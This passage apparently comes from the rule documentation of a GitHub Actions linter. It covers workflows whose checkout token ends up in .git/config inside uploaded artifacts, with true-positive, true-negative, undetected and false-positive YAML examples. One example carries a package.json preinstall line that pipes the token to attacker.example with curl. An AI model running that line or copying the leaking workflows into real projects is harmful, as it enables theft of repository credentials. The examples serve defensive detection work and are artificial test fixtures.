  - true negatives:
    - github-token.folded-read.yml (workflow, true-negative)
      ```yaml
      # situation: actions/checkout leaves the job's token in .git/config,
      #   actions/upload-artifact uploads the workspace with its hidden files, and
      #   a step runs after it; the job's permissions are contents: ${{ 'read' }}.
      # reason: GitHub reads the folded ${{ 'read' }} as read, so the token in
      #   the artifact only reads contents, which a reader of the artifacts of
      #   this public repository reads anyway. The undetected form
      #   read-only-token declares a job of the same kind, whose token writes
      #   nothing, as no-added-gain.
      # attack: a reader of the repository's artifacts downloads the artifact
      #   through the API while the job still runs, and takes the token from
      #   .git/config.
      # attack-run-behavior: the checkout writes the job's GITHUB_TOKEN into
      #   .git/config and the upload puts it in the artifact; the token has only
      #   contents: read, so it pushes nothing.
      on: push
      jobs:
        a:
          runs-on: ubuntu-latest
          permissions:
            contents: ${{ 'read' }}
          steps:
            - uses: actions/checkout@v4
            - uses: actions/upload-artifact@v4
              with:
                path: .
                include-hidden-files: true
            - run: echo after the upload
      ```
    - github-token.never-runs.yml (workflow, true-negative)
      ```yaml
      # situation: on push, the job whose id is disabled has if: false, and the job
      #   whose id is on-failure needs the job build and has if: needs.build.result
      #   == 'failure'; each of the two jobs writes contents: write, checks out the
      #   repository with actions/checkout v4, which leaves the GITHUB_TOKEN in
      #   .git/config, and uploads the workspace with the hidden files of the
      #   workspace as an artifact.
      # reason: GitHub skips the job disabled because the if of the job disabled is
      #   false. The if of the job on-failure calls no status function, so GitHub
      #   evaluates the if of the job on-failure only when the job build succeeded;
      #   needs.build.result is then success, and the if is false. When the job
      #   build fails or is skipped, GitHub skips the job on-failure without
      #   evaluating the if. So neither job runs
      #   (https://github.com/github/docs/blob/404a5f4de6cd5311e3ce2d5c076571291e0107d6/data/reusables/actions/jobs/section-using-conditions-to-control-job-execution.md).
      # attack: anyone who can read the repository downloads the artifacts of the
      #   run and reads the GITHUB_TOKEN in .git/config.
      # attack-run-behavior: GitHub skips the job disabled and the job on-failure,
      #   so no step leaves the GITHUB_TOKEN in .git/config and no step uploads an
      #   artifact.
      on: push
      jobs:
        build:
          runs-on: ubuntu-latest
          steps:
            - run: echo built
        disabled:
          if: false
          runs-on: ubuntu-latest
          permissions:
            contents: write
          steps:
            - uses: actions/checkout@v4
            - uses: actions/upload-artifact@v4
              with:
                path: .
                include-hidden-files: true
            - run: echo after the upload
        on-failure:
          needs: build
          if: needs.build.result == 'failure'
          runs-on: ubuntu-latest
          permissions:
            contents: write
          steps:
            - uses: actions/checkout@v4
            - uses: actions/upload-artifact@v4
              with:
                path: .
                include-hidden-files: true
            - run: echo after the upload
      ```
    - github-token.trailing-slash.yml (workflow, true-negative)
      ```yaml
      # situation: the job uploads the path .git/config/.
      # reason: @actions/glob matches a line that ends in / with a directory only,
      #   and .git/config is a file, so the upload takes nothing from .git.
      # attack: a reader of the repository's artifacts (anyone, in a public
      #   repository) downloads the artifact through the API while the job still
      #   runs, and takes the token from the line
      #   http.https://github.com/.extraheader (AUTHORIZATION: basic, the base64
      #   of x-access-token:<token>) of .git/config.
      # attack-run-behavior: the pattern .git/config/ matches only a directory,
      #   and .git/config is a file, so the upload finds no file and makes no
      #   artifact holding it; the reader takes no token.
      on: push
      jobs:
        a:
          runs-on: ubuntu-latest
          permissions:
            contents: write
          steps:
            - uses: actions/checkout@v4
            - uses: actions/upload-artifact@v4
              with:
                path: .git/config/
                include-hidden-files: true
            - run: echo after the upload
      ```
    - github-token.yml (workflow, true-negative)
      ```yaml
      # situation: the checkout sets persist-credentials: false, and the upload
      #   takes the workspace with its hidden files, with a step after it.
      # reason: with persist-credentials: false the checkout does not write the
      #   job's token to .git/config, so the hidden files the upload takes hold no
      #   token.
      # attack: a reader of the repository's artifacts (anyone, in a public
      #   repository) downloads the artifact through the API while the job still
      #   runs, and takes the token from the line
      #   http.https://github.com/.extraheader (AUTHORIZATION: basic, the base64
      #   of x-access-token:<token>) of .git/config.
      # attack-run-behavior: with persist-credentials: false the checkout writes
      #   no extraheader, so the .git/config in the artifact holds no token, and
      #   the reader takes none.
      on: push
      jobs:
        a:
          runs-on: ubuntu-latest
          permissions:
            contents: write
          steps:
            - uses: actions/checkout@v4
              with:
                persist-credentials: false
            - uses: actions/upload-artifact@v4
              with:
                path: .
                include-hidden-files: true
            - run: echo after the upload
      ```
- artipacked.token-input
  - detected: {uses} leaves the token given to the step in a file (.git/config, or, for actions/checkout v6 and later, a file of RUNNER_TEMP), and {upload} puts the file in an artifact
  - arguments:
    - {uses}: The uses of the step that leaves the token, as written.
    - {upload}: The uses, as written, of one upload that runs after the step and puts the file of the token in an artifact: the first of those uploads that puts the file in an artifact on no condition, else the first of those uploads.
  - consequence: anyone who can read the repository's artifacts takes the token, which does not expire when the job ends
  - remedy: set persist-credentials: false on the checkout, or upload only the files the artifact needs
  - severity: critical (found from the CVSS metrics below by the table)
  - fix kinds: persist-credentials-false
  - fact kinds: git.commit-contains (provider: github)
  - attackers: artifact-reader
  - preconditions: leaves-git-credential, artifact-taken
  - true positives:
    - token-input.yml (workflow, true-positive)
      ```yaml
      # situation: actions/checkout is given secrets.PAT as its token, and
      #   actions/upload-artifact uploads the workspace with its hidden files.
      # reason: the checkout writes the PAT into .git/config, and
      #   include-hidden-files: true puts that file in the artifact; the PAT is a
      #   secret of the repository, not the job's token, so permissions: {} does
      #   not limit what it may do.
      # attack: a reader of the repository's artifacts (anyone, in a public
      #   repository) downloads the artifact through the API, and takes the PAT
      #   from the line http.https://github.com/.extraheader of .git/config.
      # attack-run-behavior: the checkout writes secrets.PAT, not the job's token,
      #   into .git/config, and the upload, with include-hidden-files: true, puts
      #   it in the artifact; the PAT keeps working after the run, with the scopes
      #   its owner gave it, whatever permissions: {} says.
      on: push
      jobs:
        a:
          runs-on: ubuntu-latest
          permissions: {}
          steps:
            - uses: actions/checkout@v4
              with:
                token: ${{ secrets.PAT }}
            - uses: actions/upload-artifact@v4
              with:
                path: .
                include-hidden-files: true
      ```
  - true negatives:
    - token-input.trailing-slash.yml (workflow, true-negative)
      ```yaml
      # situation: the checkout is given secrets.PAT, and the job uploads the
      #   path .git/config/.
      # reason: @actions/glob matches a line that ends in / with a directory only,
      #   and .git/config is a file, so the upload takes nothing from .git.
      # attack: a reader of the repository's artifacts (anyone, in a public
      #   repository) downloads the artifact through the API, and takes the PAT
      #   from the line http.https://github.com/.extraheader of .git/config.
      # attack-run-behavior: the pattern .git/config/ matches only a directory,
      #   and .git/config is a file, so the upload finds no file and makes no
      #   artifact holding it; the reader takes no PAT.
      on: push
      jobs:
        a:
          runs-on: ubuntu-latest
          permissions: {}
          steps:
            - uses: actions/checkout@v4
              with:
                token: ${{ secrets.PAT }}
            - uses: actions/upload-artifact@v4
              with:
                path: .git/config/
                include-hidden-files: true
      ```
    - token-input.yml (workflow, true-negative)
      ```yaml
      # situation: the checkout is given secrets.PAT and sets persist-credentials:
      #   false, and the upload takes the workspace with its hidden files.
      # reason: with persist-credentials: false the checkout fetches with the PAT
      #   but does not write it to .git/config, so the hidden files the upload
      #   takes hold no PAT.
      # attack: a reader of the repository's artifacts (anyone, in a public
      #   repository) downloads the artifact through the API, and takes the PAT
      #   from the line http.https://github.com/.extraheader of .git/config.
      # attack-run-behavior: with persist-credentials: false the checkout fetches
      #   with the PAT but writes no extraheader, so the .git/config in the
      #   artifact holds no PAT, and the reader takes none.
      on: push
      jobs:
        a:
          runs-on: ubuntu-latest
          permissions: {}
          steps:
            - uses: actions/checkout@v4
              with:
                token: ${{ secrets.PAT }}
                persist-credentials: false
            - uses: actions/upload-artifact@v4
              with:
                path: .
                include-hidden-files: true
      ```

### fix kinds

- persist-credentials-false: keep the checkout's credential out of .git/config: persist-credentials: false
  - safety: review
  - possible side effects:
    - credential-not-persisted: Later steps that push or fetch with the credential of the checkout lose it.

### undetected forms

- run-command: a credential a command of a run writes into the workspace (git clone with a token in the URL, git config), or files a command uploads (gh release upload)
  - finding kinds: artipacked.github-token, artipacked.token-input
  - disposition: todo (needs: same-file)
  - example: run-command.yml (workflow, undetected)
    ```yaml
    # situation: on push with write-all, a command writes the token into
    #   .git/config (git clone with it in the URL), and actions/upload-artifact
    #   uploads the workspace.
    # reason: a todo (the same file): reading the command would find the
    #   credential.
    # cause: the rule does not read the commands of a run.
    # attack: a reader of the repository's artifacts (anyone, in a public
    #   repository) downloads the artifact through the API while the job still
    #   runs, and takes the token from the url of the remote origin in
    #   .git/config.
    # attack-run-behavior: git clone writes
    #   https://x-access-token:<token>@github.com/... as the url of the remote
    #   origin in .git/config; the upload, with include-hidden-files: true, puts
    #   it in the artifact, and while echo next runs, the token, which write-all
    #   lets write, pushes to the repository.
    on: push
    permissions: write-all
    jobs:
      a:
        runs-on: ubuntu-latest
        steps:
          - run: git clone "https://x-access-token:${GH_TOKEN}@github.com/${GITHUB_REPOSITORY}" .
            env:
              GH_TOKEN: ${{ github.token }}
          - uses: actions/upload-artifact@v4
            with: {path: ., include-hidden-files: true}
          - run: echo next
    ```
- other-upload: an action other than actions/upload-artifact that makes files of the workspace readable: actions/upload-pages-artifact, a release or a registry
  - finding kinds: artipacked.github-token, artipacked.token-input
  - disposition: todo (needs: same-file)
  - example: other-upload.yml (workflow, undetected)
    ```yaml
    # situation: on push with write-all, actions/checkout leaves the credential,
    #   and actions/upload-pages-artifact uploads the workspace.
    # reason: a todo (the same file): actions/upload-pages-artifact makes the
    #   workspace readable.
    # cause: the rule reads actions/upload-artifact only.
    # attack: a reader of the repository's artifacts (anyone, in a public
    #   repository) downloads the artifact through the API while the job still
    #   runs, and takes the token from the line
    #   http.https://github.com/.extraheader (AUTHORIZATION: basic, the base64
    #   of x-access-token:<token>) of .git/config.
    # attack-run-behavior: actions/upload-pages-artifact@v3 tars the path . with
    #   --exclude=.git, so the artifact github-pages holds no .git/config, and
    #   the reader takes no token.
    on: push
    permissions: write-all
    jobs:
      a:
        runs-on: ubuntu-latest
        steps:
          - uses: actions/checkout@v4
          - uses: actions/upload-pages-artifact@v3
            with: {path: .}
          - run: echo next
    ```
  - example: other-upload.ghsa-x6gv-2rvh-qmp6.yml (workflow, undetected)
    ```yaml
    # situation: on push, actions/checkout checks out the repository with a
    #   personal access token in its input token, and
    #   BoldestDungeon/steam-workshop-deploy v1.0.1 uploads the root of the
    #   workspace (its input path empty) as an item of the Steam Workshop. The
    #   advisory (GHSA-x6gv-2rvh-qmp6) names no workflow: it says that the action
    #   "does not exclude the `.git` directory when packaging content for
    #   deployment" and that the package may hold "github personal access tokens
    #   (PATs) embedded in `.git/config`", in particular when the workflow checks
    #   out the repository with actions/checkout.
    # reason: actions/checkout v1 to v5, with persist-credentials true (the
    #   default), leaves the credential of its input token in .git/config of the
    #   workspace (v6 and later leave the credential in a file of RUNNER_TEMP), and
    #   the action is a Docker action that puts every file of the path, .git among
    #   them, in the item it publishes on the Steam Workshop, where its subscribers
    #   download it.
    # cause: the rule checks only the steps that use actions/upload-artifact.
    # attack: one who subscribes to the item of the Steam Workshop downloads it
    #   and takes the token from the line http.https://github.com/.extraheader
    #   (AUTHORIZATION: basic, the base64 of x-access-token:<token>) of .git/config.
    # attack-run-behavior: steam_deploy.sh of the action writes a manifest whose
    #   contentfolder is the root of the workspace ($(pwd)/ and the empty path, line
    #   7) and runs steamcmd +workshop_build_item with fileExclusion "*.psd" (line
    #   114), which leaves .git in, so the published item holds .git/config with the
    #   personal access token given as the input token, which does not expire when
    #   the job ends.
    # advisory: https://github.com/advisories/GHSA-x6gv-2rvh-qmp6
    on: push
    permissions:
      contents: read
    jobs:
      deploy:
        runs-on: ubuntu-latest
        steps:
          - uses: actions/checkout@v4
            with:
              token: ${{ secrets.MOD_REPOSITORY_TOKEN }}
          - uses: BoldestDungeon/steam-workshop-deploy@a6e5b5fa5963fb5b9e22c7e0dfa046a1481c4974 # v1.0.1
            with:
              username: ${{ secrets.STEAM_USERNAME }}
              configVdf: ${{ secrets.STEAM_CONFIG_VDF }}
              appId: 763890
              publishedFileId: 1234567890
    ```
- unlisted-action: an action outside the table that writes a credential into the workspace
  - finding kinds: artipacked.github-token, artipacked.token-input
  - disposition: todo (needs: fact)
  - example: unlisted-action.yml (workflow, undetected)
    ```yaml
    # situation: on push with write-all, an action outside the table that may
    #   write a credential into .git/config of the workspace runs before
    #   actions/upload-artifact uploads it.
    # reason: a todo (a fact): a fact of whether the action writes a credential
    #   would tell.
    # cause: the rule reads the actions of its table as leaving a credential,
    #   and no other.
    # attack: a reader of the repository's artifacts (anyone, in a public
    #   repository) downloads the artifact through the API while the job still
    #   runs, and takes the token from the line
    #   http.https://github.com/.extraheader (AUTHORIZATION: basic, the base64
    #   of x-access-token:<token>) of .git/config.
    # attack-run-behavior: when example/writes-a-token writes a token into
    #   .git/config of the workspace, the upload, with include-hidden-files:
    #   true, puts it in the artifact, and while echo next and the post steps
    #   run, the reader uses it.
    on: push
    permissions: write-all
    jobs:
      a:
        runs-on: ubuntu-latest
        steps:
          - uses: example/writes-a-token@v1
          - uses: actions/upload-artifact@v4
            with: {path: ., include-hidden-files: true}
          - run: echo next
    ```
- other-job: a credential left in one job and put in an artifact in another (an artifact downloaded and uploaded again), or left and uploaded inside a composite action the job calls, whose steps are paired only when its action.yml is an input on its own
  - finding kinds: artipacked.github-token, artipacked.token-input
  - disposition: todo (needs: repo-file)
  - example: other-job.yml (workflow, undetected)
    ```yaml
    # situation: on push with write-all, a job uses the local composite action
    #   ./.github/actions/checkout-and-upload.
    # reason: a todo (a file of the repository): the upload is in another job
    #   than the step that left the credential (a job that downloads the
    #   artifact of the first and uploads it again), or in a composite action
    #   the job calls.
    # cause: the rule pairs the steps of one job or of one composite action read
    #   as an input of its own.
    # attack: a reader of the repository's artifacts (anyone, in a public
    #   repository) downloads the artifact through the API while the job still
    #   runs, and takes the token from the line
    #   http.https://github.com/.extraheader (AUTHORIZATION: basic, the base64
    #   of x-access-token:<token>) of .git/config.
    # attack-run-behavior: when the local composite action checks out and
    #   uploads the workspace with its hidden files, the artifact holds
    #   .git/config with the job's token, which write-all lets write, and while
    #   echo after and the post steps run, the token pushes to the repository;
    #   the action.yml is not part of this example.
    on: push
    permissions: write-all
    jobs:
      a:
        runs-on: ubuntu-latest
        steps:
          - uses: ./.github/actions/checkout-and-upload
          - run: echo after
    ```
- checkout-v6: actions/checkout v6 and later, which keep the credential in RUNNER_TEMP, out of the workspace, with no upload whose path includes the file git-credentials-&lt;uuid>.config of RUNNER_TEMP (a line of path that starts with \${{ runner.temp }} and includes the file is reported)
  - finding kinds: artipacked.github-token, artipacked.token-input
  - disposition: no-added-gain
  - example: checkout-v6.yml (workflow, undetected)
    ```yaml
    # situation: on push with write-all, actions/checkout@v6 checks out, and
    #   actions/upload-artifact uploads the workspace with its hidden files.
    # reason: no added gain: v6 keeps the credential in RUNNER_TEMP, out of the
    #   workspace.
    # cause: the rule's table of actions/checkout takes v6 on as leaving nothing
    #   in .git/config.
    # attack: a reader of the repository's artifacts (anyone, in a public
    #   repository) downloads the artifact through the API while the job still
    #   runs, and takes the token from the line
    #   http.https://github.com/.extraheader (AUTHORIZATION: basic, the base64
    #   of x-access-token:<token>) of .git/config.
    # attack-run-behavior: actions/checkout@v6 keeps the credential under
    #   RUNNER_TEMP, out of the workspace, so the .git/config the upload takes
    #   holds no token, and the reader takes none.
    on: push
    permissions: write-all
    jobs:
      a:
        runs-on: ubuntu-latest
        steps:
          - uses: actions/checkout@v6
          - uses: actions/upload-artifact@v4
            with: {path: ., include-hidden-files: true}
          - run: echo next
    ```
- read-only-token: the GITHUB_TOKEN of a job whose permissions have no scope that writes
  - finding kinds: artipacked.github-token, artipacked.token-input
  - disposition: no-added-gain
  - example: read-only-token.yml (workflow, undetected)
    ```yaml
    # situation: on push with contents: read, actions/checkout leaves the
    #   GITHUB_TOKEN in .git/config, and actions/upload-artifact uploads it.
    # reason: no added gain: the job's token writes nothing. The true negative
    #   github-token.folded-read of the kind artipacked.github-token is a job
    #   of the same kind.
    # cause: the rule leaves out the GITHUB_TOKEN of a job whose permissions
    #   write no scope.
    # attack: a reader of the repository's artifacts (anyone, in a public
    #   repository) downloads the artifact through the API while the job still
    #   runs, and takes the token from the line
    #   http.https://github.com/.extraheader (AUTHORIZATION: basic, the base64
    #   of x-access-token:<token>) of .git/config.
    # attack-run-behavior: the upload puts .git/config with the job's token in
    #   the artifact, and the reader takes it while echo next runs, but
    #   permissions gives it contents: read only, so it pushes nothing.
    on: push
    permissions:
      contents: read
    jobs:
      a:
        runs-on: ubuntu-latest
        steps:
          - uses: actions/checkout@v4
          - uses: actions/upload-artifact@v4
            with: {path: ., include-hidden-files: true}
          - run: echo next
    ```
- before-v4: the GITHUB_TOKEN in an artifact of actions/upload-artifact v1 to v3, an artifact that the REST API and the web page give only after the run, when the token has expired
  - finding kinds: artipacked.github-token, artipacked.token-input
  - disposition: no-added-gain
  - example: before-v4.yml (workflow, undetected)
    ```yaml
    # situation: on push with write-all, actions/checkout leaves the
    #   GITHUB_TOKEN in .git/config, and actions/upload-artifact@v3.1.3 uploads
    #   the workspace.
    # reason: no added gain: the artifact of v3 is there only after the run,
    #   when the GITHUB_TOKEN has expired.
    # cause: the rule leaves out the GITHUB_TOKEN in an upload whose artifact
    #   cannot be downloaded during the run (actions/upload-artifact before
    #   v4); a lasting token in such an upload is still reported.
    # attack: a reader of the repository's artifacts (anyone, in a public
    #   repository) downloads the artifact through the API while the job still
    #   runs, and takes the token from the line
    #   http.https://github.com/.extraheader (AUTHORIZATION: basic, the base64
    #   of x-access-token:<token>) of .git/config.
    # attack-run-behavior: actions/upload-artifact@v3.1.3 puts .git/config with
    #   the token in the artifact, which can be downloaded only after the run
    #   ends; by then the GITHUB_TOKEN has expired, and the reader cannot use
    #   it.
    on: push
    permissions: write-all
    jobs:
      a:
        runs-on: ubuntu-latest
        steps:
          - uses: actions/checkout@v4
          - uses: actions/upload-artifact@v3.1.3
            with: {path: .}
          - run: echo next
    ```
- same-run-job: the GITHUB_TOKEN in an artifact of actions/upload-artifact v1 to v3 that another job of the same run downloads with actions/download-artifact v1 to v3 before the job that uploads ends, where the job that downloads runs code of an attacker: whether the download finds the artifact before the job that uploads ends is decided by GitHub Enterprise Server, the only place where v1 to v3 run (v1 to v3 do not run on github.com), and GitHub's documentation does not say
  - finding kinds: artipacked.github-token, artipacked.token-input
  - disposition: limitation (decided by: run-time)
  - example: same-run-job.yml (workflow, undetected)
    ```yaml
    # situation: on pull_request_target, the job a checks out the base with
    #   actions/checkout and uploads the workspace with
    #   actions/upload-artifact@v3.1.3; the job b, which does not need a, downloads
    #   with actions/download-artifact@v3 and builds the pull request's head.
    # reason: the job b runs the code of the pull request; when b downloads the
    #   artifact before a ends, the GITHUB_TOKEN of a, which may write, still
    #   works, and the code of the pull request can read the token from
    #   .git/config of the artifact.
    # cause: the rule leaves out the GITHUB_TOKEN in an upload of v1 to v3, whose
    #   artifact the REST API and the web page give only after the run; whether
    #   a download of another job of the same run finds the artifact before the
    #   job that uploads ends is decided by the server of GitHub Enterprise
    #   Server.
    # attack-value: the file package.json in the pull request's head = "{\"scripts\":{\"preinstall\":\"grep -r extraheader . | curl -d @- https://attacker.example/PWNED\"}}"
    # attack-run-behavior: on GitHub Enterprise Server, when the download of b
    #   finds the artifact of a while a still runs, npm ci runs the preinstall of
    #   the pull request, which sends the line of .git/config with the token of
    #   a to the server of the attacker; on github.com, v1 to v3 do not run.
    on: pull_request_target
    permissions: write-all
    jobs:
      a:
        runs-on: ubuntu-latest
        steps:
          - uses: actions/checkout@v4
          - uses: actions/upload-artifact@v3.1.3
            with: {name: ws, path: .}
          - run: sleep 600
      b:
        runs-on: ubuntu-latest
        permissions: {}
        steps:
          - uses: actions/download-artifact@v3
            with: {name: ws, path: ws}
          - uses: actions/checkout@v4.2.2
            with:
              ref: ${{ github.event.pull_request.head.sha }}
              persist-credentials: false
          - run: npm ci
    ```
- other-file: a credential in a file other than .git/config
  - finding kinds: artipacked.github-token, artipacked.token-input
  - disposition: other-rule (rule: secrets-in-artifacts)
  - example: other-file.yml (workflow, undetected)
    ```yaml
    # situation: google-github-actions/auth leaves a credential in
    #   gha-creds-*.json, and actions/upload-artifact uploads the workspace.
    # reason: another rule's: secrets-in-artifacts reports a credential in
    #   gha-creds-*.json.
    # cause: the rule reads a credential in .git/config only.
    # attack: a reader of the repository's artifacts (anyone, in a public
    #   repository) downloads the artifact through the API, and takes the
    #   service account key from gha-creds-*.json.
    # attack-run-behavior: google-github-actions/auth writes the key of
    #   secrets.GCP to gha-creds-<hex>.json at the top of the workspace, and the
    #   upload of path . puts it in the artifact; the key keeps working after
    #   the run.
    on: push
    jobs:
      a:
        runs-on: ubuntu-latest
        steps:
          - uses: google-github-actions/auth@v2
            with: {credentials_json: '${{ secrets.GCP }}'}
          - uses: actions/upload-artifact@v4
            with: {path: .}
    ```
- remote-callee: a job or a step inside a reusable workflow of another repository (uses: owner/repo/.github/workflows/&lt;file>@&lt;ref>) whose content the fact workflow.definition does not give. For every rule: a run that does not ask the fact (a run without --online and without the answer in --facts). For a quality rule, also: a run where the linter asked the fact and got no answer (an answer of unknown: the GitHub API did not give the file), and a call deeper than the 3 levels of reusable workflows that the linter reads, for which the linter does not ask the fact. The rule reads a reusable workflow of another repository only from the answer of workflow.definition. For a rule that is not a quality rule (a rule with a threat), the last two forms are the inconclusive kind remote-callee-unknown, not this form
  - finding kinds: artipacked.github-token, artipacked.token-input
  - disposition: todo (needs: fact)
  - example: remote-callee.yml (workflow, undetected)
    ```yaml
    # situation: a job calls the reusable workflow .github/workflows/w.yml of
    #   the repository example-org/artipacked-unanswered, whose content is the
    #   workflow of the true positive github-token (github-token.last-step.yml)
    #   of the rule, with on: workflow_call in place of the on of
    #   github-token.last-step.yml. The linter has no answer of the fact
    #   workflow.definition for the reusable workflow.
    # reason: a todo (a fact): the jobs of a reusable workflow run on the event
    #   that started the run of the calling job, and the linter does not read
    #   the reusable workflow.
    # cause: the rule reads a reusable workflow of another repository only from
    #   the answer of workflow.definition.
    # attack: a reader of the repository's artifacts (anyone, in a public
    #   repository) downloads the artifact through the API while the job still
    #   runs, and takes the token from the line
    #   http.https://github.com/.extraheader (AUTHORIZATION: basic, the base64
    #   of x-access-token:<token>) of .git/config.
    # attack-run-behavior: the checkout writes the job's GITHUB_TOKEN, which may
    #   write contents, into .git/config; the upload, with include-hidden-files:
    #   true, puts .git/config in the artifact, which can be downloaded once the
    #   upload ends; the post steps still run after it, and until the job ends
    #   the token pushes to the repository.
    on: push
    permissions: {}
    jobs:
      c:
        uses: example-org/artipacked-unanswered/.github/workflows/w.yml@eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee
    ```

### inconclusive

- upload-input-unknown: an upload whose with, a line of path, or include-hidden-files is a \${{ }}, or a path not of the workspace: what it takes is not analyzed
  - disposition: todo (needs: same-file)
  - example: upload-input-unknown.yml (workflow, inconclusive)
    ```yaml
    # situation: actions/checkout leaves the token of the job in .git/config,
    #   and actions/upload-artifact uploads the path ${{ inputs.p }} with hidden
    #   files.
    # reason: the path is a ${{ }}, so what the upload takes is not analyzed.
    # attack: a reader of the repository's artifacts (anyone, in a public
    #   repository) downloads the artifact through the API while the job still
    #   runs, and takes the token from the line
    #   http.https://github.com/.extraheader (AUTHORIZATION: basic, the base64
    #   of x-access-token:<token>) of .git/config.
    # attack-run-behavior: when inputs.p names the workspace or .git/config, the
    #   upload, with include-hidden-files: true, puts .git/config with the job's
    #   token, which write-all lets write, in the artifact, and while echo next
    #   and the post steps run, the token pushes to the repository.
    on: push
    permissions: write-all
    jobs:
      a:
        runs-on: ubuntu-latest
        steps:
          - uses: actions/checkout@v4
          - uses: actions/upload-artifact@v4
            with: {path: '${{ inputs.p }}', include-hidden-files: true}
          - run: echo next
    ```
- credential-input-unknown: a step of actions/checkout at a ref that may leave the git credential in .git/config of the workspace (a release before v6, a branch, or a SHA of no known release), where (a) the input persist-credentials, the input path or the whole with is a \${{ }}, or (b) the input path names a directory out of the workspace: neither whether the step leaves the git credential in a .git/config of the workspace nor the directory of that .git/config is analyzed; and a step of actions/checkout at a ref that may keep the git credential in the file git-credentials-&lt;uuid>.config of RUNNER_TEMP (v6 and later, a branch, or a SHA of no known release), where the input persist-credentials is a \${{ }}, before an upload whose path includes that file: whether the step leaves the git credential in that file is not analyzed
  - disposition: todo (needs: same-file)
  - example: credential-input-unknown.yml (workflow, inconclusive)
    ```yaml
    # situation: actions/checkout takes persist-credentials from ${{ inputs.p
    #   }}, and actions/upload-artifact then uploads the workspace with its
    #   hidden files.
    # reason: persist-credentials is a ${{ }}, so whether the checkout leaves
    #   the token of the job in the workspace is not known.
    # attack: a reader of the repository's artifacts (anyone, in a public
    #   repository) downloads the artifact through the API while the job still
    #   runs, and takes the token from the line
    #   http.https://github.com/.extraheader (AUTHORIZATION: basic, the base64
    #   of x-access-token:<token>) of .git/config.
    # attack-run-behavior: when inputs.p is true, the checkout writes the job's
    #   token, which write-all lets write, into .git/config; the upload, with
    #   include-hidden-files: true, puts it in the artifact, and while echo next
    #   and the post steps run, the token pushes to the repository.
    #   actions/checkout reads an empty persist-credentials as false.
    on: push
    permissions: write-all
    jobs:
      a:
        runs-on: ubuntu-latest
        steps:
          - uses: actions/checkout@v4
            with: {persist-credentials: '${{ inputs.p }}'}
          - uses: actions/upload-artifact@v4
            with: {path: ., include-hidden-files: true}
          - run: echo next
    ```
- remote-callee-unknown: a job that calls a reusable workflow of another repository, when the linter asked the fact workflow.definition for the reusable workflow and got no answer (the token that the linter uses cannot read the file, the file is larger than the limit, or the linter has used up the requests it may send to the GitHub API), or when the call is deeper than the 3 levels of reusable workflows that the linter reads, for which the linter does not ask the fact: the rule does not read the jobs and the steps of the reusable workflow
  - disposition: todo (needs: fact)
  - example: remote-callee-unknown.yml (workflow, inconclusive)
    ```yaml
    # situation: a job calls the reusable workflow .github/workflows/w.yml of
    #   the repository example-org/artipacked-unknown, whose content is the
    #   workflow of the true positive github-token (github-token.last-step.yml)
    #   of the rule, with on: workflow_call in place of the on of
    #   github-token.last-step.yml. The linter asked the fact
    #   workflow.definition for the reusable workflow and got no answer.
    # reason: what the jobs of the reusable workflow do is in the file that the
    #   linter could not read; whoever changes the uses, such as the author of a
    #   pull request, can name a reusable workflow that the token that the
    #   linter uses cannot read.
    # attack: a reader of the repository's artifacts (anyone, in a public
    #   repository) downloads the artifact through the API while the job still
    #   runs, and takes the token from the line
    #   http.https://github.com/.extraheader (AUTHORIZATION: basic, the base64
    #   of x-access-token:<token>) of .git/config.
    # attack-run-behavior: the checkout writes the job's GITHUB_TOKEN, which may
    #   write contents, into .git/config; the upload, with include-hidden-files:
    #   true, puts .git/config in the artifact, which can be downloaded once the
    #   upload ends; the post steps still run after it, and until the job ends
    #   the token pushes to the repository.
    on: push
    permissions: {}
    jobs:
      c:
        uses: example-org/artipacked-unknown/.github/workflows/w.yml@eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee
    ```

### false positive forms

- hidden-files-case: include-hidden-files written in a case other than true, True and TRUE (tRuE): core.getBooleanInput refuses it, so the step fails and uploads nothing
  - finding kinds: artipacked.github-token, artipacked.token-input
  - disposition: todo (needs: same-file)
  - example: hidden-files-case.yml (workflow, false-positive)
    ```yaml
    # situation: the job checks out the repository and uploads the workspace
    #   with include-hidden-files: tRuE.
    # reason: core.getBooleanInput takes true, True and TRUE only, and throws on
    #   tRuE ("const trueValue = ['true', 'True', 'TRUE']",
    #   https://github.com/actions/toolkit/blob/6cb87687384f971ebb756e43c7a56f62cd80a31d/packages/core/src/core.ts#L198-L208;
    #   actions/upload-artifact reads include-hidden-files with it,
    #   https://github.com/actions/upload-artifact/blob/043fb46d1a93c77aae656e7c1c64a875d1fc6a0a/src/upload/input-helper.ts#L12),
    #   so the step fails and uploads nothing.
    # cause: the rule reads include-hidden-files as true in any case of the
    #   letters, so it takes the upload as one of the hidden files.
    # attack: a reader of the repository's artifacts (anyone, in a public
    #   repository) downloads the artifact through the API while the job still
    #   runs, and takes the token from the line
    #   http.https://github.com/.extraheader (AUTHORIZATION: basic, the base64
    #   of x-access-token:<token>) of .git/config.
    # attack-run-behavior: core.getBooleanInput throws on tRuE, so the upload
    #   step fails and makes no artifact; the reader has nothing to download.
    on: push
    jobs:
      a:
        runs-on: ubuntu-latest
        permissions:
          contents: write
        steps:
          - uses: actions/checkout@v4
          - uses: actions/upload-artifact@v4
            with:
              path: .
              include-hidden-files: tRuE
          - run: echo after the upload
    ```
- credential-removed: a step before the upload that removes the credential that actions/checkout wrote to .git/config: a second checkout of the same path with persist-credentials false, or git config --unset-all http.https://github.com/.extraheader
  - finding kinds: artipacked.github-token, artipacked.token-input
  - disposition: todo (needs: same-file)
  - example: credential-removed.yml (workflow, false-positive)
    ```yaml
    # situation: each job checks out the repository (the job b with
    #   secrets.PAT as its token), then a run takes the token out of
    #   .git/config, then the job uploads the workspace with its hidden files.
    # reason: the upload takes no token.
    # cause: the rule does not read the run that takes the token out.
    # attack: a reader of the repository's artifacts (anyone, in a public
    #   repository) downloads the artifact through the API while the job still
    #   runs, and takes the token (the GITHUB_TOKEN, or the PAT of the job b)
    #   from the line
    #   http.https://github.com/.extraheader (AUTHORIZATION: basic, the base64
    #   of x-access-token:<token>) of .git/config.
    # attack-run-behavior: git config --unset-all removes the extraheader from
    #   .git/config before the upload, so the .git/config in the artifact holds
    #   no token, and the reader takes none.
    on: push
    jobs:
      a:
        runs-on: ubuntu-latest
        permissions:
          contents: write
        steps:
          - uses: actions/checkout@v4
          - run: git config --unset-all http.https://github.com/.extraheader
          - uses: actions/upload-artifact@v4
            with:
              path: .
              include-hidden-files: true
          - run: echo after the upload
      b:
        runs-on: ubuntu-latest
        permissions: {}
        steps:
